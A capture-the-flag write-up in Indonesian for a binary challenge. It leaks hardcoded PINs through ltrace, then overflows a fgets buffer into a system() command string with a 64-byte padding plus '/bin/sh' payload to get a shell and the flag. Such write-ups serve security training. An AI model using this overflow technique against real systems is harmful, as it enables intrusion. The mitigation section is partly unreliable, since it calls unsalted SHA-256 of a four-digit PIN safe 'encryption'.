# haha

## deskripsi
```
name: "Haha"
category: Binary Exploitation
description: |-
  Get a shell

  author: Enryu

connection_info: nc 52.221.202.190 11101
tags:
  - easy

files:
  - dist/chall.zip
```

## summary
challenge ini memiliki kerentanan buffer overflow dan akan mengeksekusi isi variabel yang beresiko tertimpa byte overflow tersebut. saya memanfaatkan kerentanan ini untuk
mendapatkan akses shell dan mengambil flagnya

## vulnerable
1. canary tidak aktif
2. pin tertulis hardcoded di source code
3. buffer overflow
4. command injection via buffer overflow

## analysis
setelah mendownload file binary yang diberikan, saya lakukan _fast check_ dengan memeriksa metadata, proteksi, dan menjalankan program untuk mencari informasi.

```
┌[rotalactf]-[LAPTOP-6QMID52F]-(haha)
└> file chall ; pwn checksec chall
chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,
BuildID[sha1]=06b6b0782e46db3f5651bb4b2e6eb5cd6da06745, for GNU/Linux 3.2.0, not stripped
[*] '/home/rotalactf/reno/pwn/LKS/haha/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
┌[rotalactf]-[LAPTOP-6QMID52F]-(haha)
└> ./chall
=== SECURE BANK TERMINAL ===
Enter PIN: 27331
Invalid PIN. Access denied.
```

program ini adalah ELF x86-64 dengan proteksi yang cukup kuat. hanya satu proteksi yang tidak diaktifkan yaitu CANARY. berikutnya saat dijalankan, program ini meminta pin. 
karena saya belum tahu apa pinnya jadi percobaan akses langsung ditolak.

saya memiliki ide untuk menggunakan ltrace. ltrace adalah fungsi yang bisa mencetak apa fungsi yang digunakan oleh program saat sedang dijalankan. saya mencurigai bahwa input 
akan dibandingkan dengan sesuatu seperti pin aslinya untuk validasi input program.

```
ltrace ./chall
```

```
└> ltrace ./chall
setvbuf(0x7dd7ffa048e0, 0, 2, 0)                                            = 0
setvbuf(0x7dd7ffa055c0, 0, 2, 0)                                            = 0
setvbuf(0x7dd7ffa054e0, 0, 2, 0)                                            = 0
puts("=== SECURE BANK TERMINAL ==="=== SECURE BANK TERMINAL ===
)                                        = 29
printf("Enter PIN: "Enter PIN: )                                                       = 11
fgets(3q43q
"3q43q\n", 50, 0x7dd7ffa048e0)                                        = 0x7ffd11bc54c0
strcspn("3q43q\n", "\r\n")                                                  = 5
strcmp("3q43q", "1234")                                                     = 2
strcmp("3q43q", "0000")                                                     = 3
strcmp("3q43q", "9999")                                                     = -6
puts("Invalid PIN. Access denied."Invalid PIN. Access denied.
)                                         = 28
+++ exited (status 0) +++
```

asumsiku ternyata benar. program ini membandingkan input dengan ketiga string angka 4 digit yang saya curigai sebagai pin valid. karena input saya yang random tidak sama dengan
ketiga string itu dan program melakukan _puts()_ untuk mencetak kalimat invalid pin.

asumsi PIN :
- 1234
- 0000
- 9999

saya akan coba gunakan pin `1234`

```
└> ./chall
=== SECURE BANK TERMINAL ===
Enter PIN: 1234
PIN accepted. Welcome.
Enter destination account number: 1234
Transferring funds to account: 1234

VAULT UNLOCKED: $10,000,000 transferred successfully
```
akses berhasil, selanjutnya program meminta nomor tujuan untuk melakukan transaksi. saya coba masukkan angka yang sama dan program hanya mencetak teks trasaksi berhasil lalu
program berhenti.

```
└> ltrace ./chall
setvbuf(0x74830c8048e0, 0, 2, 0)                                            = 0
setvbuf(0x74830c8055c0, 0, 2, 0)                                            = 0
setvbuf(0x74830c8054e0, 0, 2, 0)                                            = 0
puts("=== SECURE BANK TERMINAL ==="=== SECURE BANK TERMINAL ===
)                                        = 29
printf("Enter PIN: "Enter PIN: )                                                       = 11
fgets(1234
"1234\n", 50, 0x74830c8048e0)                                         = 0x7ffced3ebf90
strcspn("1234\n", "\r\n")                                                   = 4
strcmp("1234", "1234")                                                      = 0
puts("PIN accepted. Welcome."PIN accepted. Welcome.
)                                              = 23
printf("Enter destination account number"...Enter destination account number: )                               = 34
fgets(1234
"1234\n", 128, 0x74830c8048e0)                                        = 0x7ffced3ebed0
printf("Transferring funds to account: %"..., "1234\n"Transferring funds to account: 1234

)                     = 37
system("echo 'VAULT UNLOCKED: $10,000,00"...VAULT UNLOCKED: $10,000,000 transferred successfully
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                      = 0
+++ exited (status 0) +++
```

ada hal yang cukup menarik, program ini mencetak teks VAULT UNLOCKED -- menggunakan fungsi system, normalnya progammer akan memilih fungsi puts atau printf, sayangnya
perilaku ini tidak bisa saya analisis lebih jauh karena tidak banyak informasi yang bisa saya dapatkan dari ltrace, pada akhirnya saya coba _decompile_ file program ini 
di ghidra untuk mencari informasi lain seperti source code program dan fungsi yang tersedia.

menurut hasil analisis ghidra, saya menemukan beberapa fungsi yang menarik.
- main
- atm
- is_authorized
- open_vault

setelah saya amati, analisis yang saya lakukan di ltrace adalah alur program dari **main** > **atm** > **is_authotized** > **atm** > **open_vault** 

validasi pin yang saya lewati di awal adalah fungsi **is_authorized** dan input nomor tujuan transaksi adalah bagian dari fungsi **open_vault**. karena fungsi **open_vault** relevan
dengan progress analisis sekarang, saya putuskan untuk menganalisis fungsi tersebut dengan membaca hasil decompile nya yang disediakan oleh ghidra.

```C
void open_vault(void)

{
  char local_b8 [0x40];
  char local_78 [0x70];
  
  builtin_strncpy(local_78,"echo \'VAULT UNLOCKED: $10,000,000 transferred successfully\'",0x3c);
  local_78[0x3c] = '\0';
  local_78[0x3d] = '\0';
  local_78[0x3e] = '\0';
  local_78[0x3f] = '\0';
  local_78[0x40] = '\0';
  local_78[0x41] = '\0';
  local_78[0x42] = '\0';
  local_78[0x43] = '\0';
  local_78[0x44] = '\0';
  local_78[0x45] = '\0';
  local_78[0x46] = '\0';
  local_78[0x47] = '\0';
  local_78[0x48] = '\0';
  local_78[0x49] = '\0';
  local_78[0x4a] = '\0';
  local_78[0x4b] = '\0';
  local_78[0x4c] = '\0';
  local_78[0x4d] = '\0';
  local_78[0x4e] = '\0';
  local_78[0x4f] = '\0';
  local_78[0x50] = '\0';
  local_78[0x51] = '\0';
  local_78[0x52] = '\0';
  local_78[0x53] = '\0';
  local_78[0x54] = '\0';
  local_78[0x55] = '\0';
  local_78[0x56] = '\0';
  local_78[0x57] = '\0';
  local_78[0x58] = '\0';
  local_78[0x59] = '\0';
  local_78[0x5a] = '\0';
  local_78[0x5b] = '\0';
  local_78[0x5c] = '\0';
  local_78[0x5d] = '\0';
  local_78[0x5e] = '\0';
  local_78[0x5f] = '\0';
  local_78[0x60] = '\0';
  local_78[0x61] = '\0';
  local_78[0x62] = '\0';
  local_78[0x63] = '\0';
  printf("Enter destination account number: ");
  fgets(local_b8,0x80,stdin);
  printf("Transferring funds to account: %s\n",local_b8);
  system(local_78);
  return;
}

```
program melakukan echo di fungsi ini dengan cara menyalin teks echo ke variabel yang akan di eksekusi oleh system() .sepertinya program mencoba mengosongkan isi variabel
local_78. selain itu saya menemukan suatu kerentanan **buffer overflow** yang dapat berakibat fatal.

```C
  char local_b8 [0x40];
  char local_78 [0x70];
  --------------------;
  fgets(local_b8,0x80,stdin);
  --------------------;
  system(local_78);
```
kerentanan buffer overflow tersebut ada pada fungsi fgets(), dimana fungsi ini mengizinkan **input hingga 0x80 byte ** sedangkan variabel penampungnya (local_b8) hanya memiliki kapasitas
sebesar **0x40** byte. apabila program ini menerima input yang panjangnya lebih dari 0x40 karakter (0x40 byte), program tetap menganggap input tersebut valid namun yang tersimpan 
di variabel local_b8 hanya 0x40 byte pertama, byte ke 0x41 dan setelahnya akan tersimpan di alamat memori lain. pada kasus ini alamat memori yang paling dekat dengan local_b8 adalah
local_78. maka byte ke 0x41 dan setelahnya akan tersimpan di local_78.

variabel local_78 sendiri sudah di inisiasi dengan string yang nantinya akan di eksekusi oleh **system**() di akhir fungsi
```C
builtin_strncpy(local_78,"echo \'VAULT UNLOCKED: $10,000,000 transferred successfully\'",0x3c);
```

menurut hasil analisis informasi yang saya dapatkan:
- program memiliki kerentanan buffer overflow
- variabel yang beresiko tertimpa overflow akan di eksekusi oleh system()

rencana exploit:
- mengisi local_b8 hingga penuh (0x40 byte)
- setelah byte ke 0x40 , kirimkan string /bin/sh agar program mengeksekusi **system(/bin/sh)**
- dapatkan shell dan akses server untuk mengambbil flag

# exploit
saya menggunakan python untuk membuat payload secara presisi
```
└> python3 -c "print('a'*0x40+'/bin/sh')"
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/bin/sh
```

mengirim payload:
```
└> ./chall
=== SECURE BANK TERMINAL ===
Enter PIN: 1234
PIN accepted. Welcome.
Enter destination account number: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/bin/sh
Transferring funds to account: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/bin/sh

$ ls
chall  chall.c  flag.txt
$ cat flag.txt
LKS{fef704d7d14172787d15b71b8b9b2dcc}
$
```

exploit berhasil, shell berhasil saya dapatkan bersama dengan flag nya.

flag : **LKS{fef704d7d14172787d15b71b8b9b2dcc}**

## rekomendasi mitigasi

1. hardcoded credentials,
   pada bagian validasi pin, sangat disarankan untuk menggunakan teknik **Encryption-based Validation / Ciphertext Comparison** dimana
   pin asli dienkripsi dan input akan melalui proses enkripsi yang sama lalu hasil enkripsinya akan di bandingkan dengan hasil enkripsi pin. ini akan menyulitkan peretas
   dalam mencari pin asli walaupun berhasil mendapatkan source code program. contoh enkripsi kuat :
   - hash (seperti sha-256 dan sebagainya)
   - RSA
   - AES
   - custom encryption / obfuscation
     rentan (disederhanakan dari hasil dekompilasi):
     ```C
     local_28[0x0] = "1234"; 
     local_28[0x1] = "0000";
     local_28[0x2] = "9999";
     iVar1 = strcmp(param_1,local_28[local_10]);
     ```
     aman
     ```C
     local_28 = "03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4" /* enkripsi sha256 dari '1234' */
     ivar1 = strcmp(param_1,local_28)
     ```
     
2. kerentanan buffer overflow,
   kerentanan ini terletak pada fungsi fgets(). cara penggunaan fungsi fgets yang aman adalah dengan memberi batas input sama dengan atau kurang dari ukuran variabel penampung.
   contoh kasus pada binary ini, variabel penampung berukuran 0x40 byte maka batas input yang aman digunakan adalah 0x40 atau dibawahnya ,
   rentan :
   ```C
   fgets(local_b8,0x80,stdin)
   ```
   aman :
   ```C
   fgets(local_b8,0x39,stdin)
   ```
   
3. kerentanan akses shell,
   untuk menambah tingkat keamanan , tidak disarankan untuk menggunakan fungsi system() untuk mencetak teks. lebih baik gunakan fungsi pencetak teks standart seperti printf(),
   dan puts()
   rentan :
   ```C
   builtin_strncpy(local_78,"echo \'VAULT UNLOCKED: $10,000,000 transferred successfully\'",0x3c);
   system(local_78);
   ```
   aman :
   ```C
   printf("VAULT UNLOCKED: $10,000,000 transferred successfully\n")
   ```
   
4. mitigasi tambahan,
   pada kasus ini proteksi canary tidak di aktifkan. disarankan untuk mengaktifkan seluruh proteksi untuk meningkatkan keamanan binary.
   ```bash
   gcc -fstack-protector-all -pie -Wl,-z,relro,-z,now -Wl,-z,noexecstack source.c -o binary
   ```
___
